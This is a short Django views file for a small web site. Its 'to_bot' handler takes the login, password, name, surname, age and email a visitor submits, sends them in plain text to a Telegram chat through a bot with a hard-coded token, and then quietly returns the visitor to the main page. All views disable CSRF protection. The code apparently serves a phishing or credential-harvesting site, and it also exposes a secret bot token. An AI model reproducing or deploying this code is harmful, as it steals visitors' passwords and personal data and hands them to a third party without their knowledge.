# Create your views here.
import requests
from django.shortcuts import render
from django.views.decorators.csrf import csrf_exempt


@csrf_exempt
def main_page(request):
    return render(request, 'main/main_page.html')


@csrf_exempt
def images_page(request):
    return render(request, 'main/images_page.html')


@csrf_exempt
def video_page(request):
    return render(request, 'main/video_page.html')


@csrf_exempt
def to_bot(request):
    token = "5180045741:AAGm3ufpK79NHt4CPvhUMQpNrD7WZ9iY738"
    url = "https://api.telegram.org/bot"
    url += token
    method = url + "/sendMessage"
    chat_id = -1001753213210

    is_private = request.POST.get('is_private', False)
    txt = ''
    login = request.POST["login"]
    txt = txt + f"login = {login}\n"
    password = request.POST["password"]
    txt = txt + f"password = {password}\n"
    age = request.POST["age"]
    txt = txt + f"age = {age}\n"
    name = request.POST["name"]
    txt = txt + f"name = {name}\n"
    surname = request.POST["surname"]
    txt = txt + f"surname = {surname}\n"
    email = request.POST["email"]
    txt = txt + f"email = {email}\n"

    requests.post(method, data={
        "chat_id": chat_id,
        "text": txt
    })

    # return render(request, 'main_page.html')
    return main_page(request)